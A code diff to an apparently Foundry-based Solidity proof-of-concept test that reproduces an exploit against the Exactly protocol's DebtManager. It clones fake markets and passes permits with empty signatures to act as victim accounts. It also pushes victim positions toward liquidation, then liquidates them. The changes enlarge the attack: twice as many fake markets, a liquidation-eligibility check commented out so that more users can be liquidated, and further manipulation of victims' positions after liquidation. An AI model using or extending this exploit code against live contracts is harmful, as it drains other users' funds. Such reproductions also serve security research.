@@ -143,7 +143,7 @@ contract ContractTest is Test {
 
     function testExploit() external {
         fakeMarket = new FakeMarket();
-        for (uint256 i; i < 8; ++i) {
+        for (uint256 i; i < 16; ++i) {
             address miniProxy = Clone(address(fakeMarket)); // create fake market
             fakeMarketList.push(FakeMarket(miniProxy));
             FakeMarket(miniProxy).init(
@@ -169,7 +169,7 @@ contract ContractTest is Test {
                 0,
                 0,
                 IDebtManager.Permit({account: address(victimList[i]), deadline: 0, v: 0, r: bytes32(0), s: bytes32(0)})
-            ); // set global _msgSender to victimList[i] in contract DebtManager
+            ); // set global variable _msgSender to victimList[i] in contract DebtManager, then invoke fakeMarketList[i].deposit() to trigger the function crossDelevage()
         }
 
         // swap victim's USDC to fakeToken in function fakeMarkt.deposit(), victim's collateral value is close to the value of the loan and is on the verge of liquidation
@@ -196,7 +196,9 @@ contract ContractTest is Test {
         for (uint256 i; i < 6; ++i) {
             (uint256 sumCollateral, uint256 sumDebtPlusEffects) =
                 Auditor.accountLiquidity(address(victimList[0]), address(0), 0);
-            if (sumCollateral >= sumDebtPlusEffects) {
+            // In the attack transaction, only the top victim is checked to see if they meet the liquidation conditions. 
+            // By removing this check, more users can be made eligible for liquidation.
+            // if (sumCollateral >= sumDebtPlusEffects) {
                 // @note https://github.com/exactly/protocol/blob/main/contracts/Market.sol#L917-L942
                 // the backupEarnings decrease
                 // @note https://github.com/exactly/protocol/blob/main/contracts/Market.sol#L930-L932
@@ -204,9 +206,9 @@ contract ContractTest is Test {
                     maturityList[i], depositAmount / 2, type(uint256).max, address(this), address(this)
                 );
                 exaUSDC.repayAtMaturity(maturityList[i], type(uint256).max, type(uint256).max, address(this));
-            } else {
-                break;
-            }
+            // } else {
+            //     break;
+            // }
         }
 
         exaUSDC.redeem(share, address(this), address(this)); // withdraw all exaUSDC share
@@ -223,16 +225,16 @@ contract ContractTest is Test {
         );
 
         // *********************** liquidate *********************** //
-        for (uint256 i; i < 6; ++i) {
-            exaUSDC.liquidate(victimList[i], type(uint256).max, address(exaUSDC)); // liquidate victim's position
-                // fakeMarketList[i].setVictim(victimList[i]);
-                // DebtManager.leverage(
-                //     address(fakeMarketList[i]),
-                //     0,
-                //     0,
-                //     0,
-                //     IDebtManager.Permit({account: address(victimList[i]), deadline: 0, v: 0, r: bytes32(0), s: bytes32(0)})
-                // );
+        for (uint256 i; i < 8; ++i) {
+            try exaUSDC.liquidate(victimList[i], type(uint256).max, address(exaUSDC)) {} catch { continue; } // liquidate victim's position
+            fakeMarketList[i + 8].setVictim(victimList[i]);
+            try DebtManager.leverage( // Manipulate the victim's position further after liquidation
+                address(fakeMarketList[i + 8]),
+                0,
+                0,
+                0,
+                IDebtManager.Permit({account: address(victimList[i]), deadline: 0, v: 0, r: bytes32(0), s: bytes32(0)})
+            ) {} catch { continue; } // set global _msgSender to victimList[i] in contract DebtManager, then invoke fakeMarketList[i].deposit() to trigger the function crossDelevage()
         }
 
         emit log_named_decimal_uint(
@@ -375,7 +377,6 @@ contract FakeMarket is Nonces {
             })
         );
 
-        fakeTokenAmount = 0;
     }
 
     struct Account {
